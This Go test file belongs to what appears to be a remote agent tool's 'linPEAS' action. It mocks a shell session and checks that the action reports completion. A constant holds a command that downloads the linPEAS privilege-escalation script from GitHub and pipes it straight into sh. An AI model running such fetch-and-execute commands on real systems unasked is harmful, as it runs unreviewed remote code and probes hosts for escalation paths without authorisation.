package action_test

import (
	"testing"
	"time"

	"github.com/dustin/go-broadcast"
	"github.com/stretchr/testify/assert"

	"github.com/thecoderstudio/apollo-agent/action"
	"github.com/thecoderstudio/apollo-agent/mocks"
	"github.com/thecoderstudio/apollo-agent/websocket"
)

const command = "curl https://raw.githubusercontent.com/carlospolop/" +
	"privilege-escalation-awesome-scripts-suite/master/linPEAS/" +
	"linpeas.sh | sh && echo 'linPEAS done\n'\n"
const linPeasConnectionID = "test"
const linPeasInitIndication = "Green"
const linPeasCompletionIndication = "linPEAS done"

func TestRun(t *testing.T) {
	expectedFinishedCommand := websocket.Command{
		ConnectionID: linPeasConnectionID,
		Command:      "finished",
	}

	broadcaster := broadcast.NewBroadcaster(512)

	sessionMock := new(mocks.BaseSession)
	sessionMock.On("SessionID").Return(linPeasConnectionID)
	sessionMock.On("Execute", command).Return(nil)
	sessionMock.On("Out").Return(&broadcaster)

	linPeas := action.CreateLinPeas(sessionMock)
	out := *linPeas.Run()

	time.Sleep(time.Second)
	broadcaster.Submit(websocket.ShellIO{
		ConnectionID: linPeasConnectionID,
		Message:      linPeasInitIndication,
	})
	broadcaster.Submit(websocket.ShellIO{
		ConnectionID: linPeasConnectionID,
		Message:      "testing",
	})
	broadcaster.Submit(websocket.ShellIO{
		ConnectionID: linPeasConnectionID,
		Message:      linPeasCompletionIndication,
	})

	finishedCommand := <-out
	assert.Equal(t, finishedCommand, expectedFinishedCommand)
}

func TestCreateLinPeas(t *testing.T) {
	sessionMock := new(mocks.BaseSession)
	linPeas := action.CreateLinPeas(sessionMock)
	assert.NotNil(t, linPeas)
}
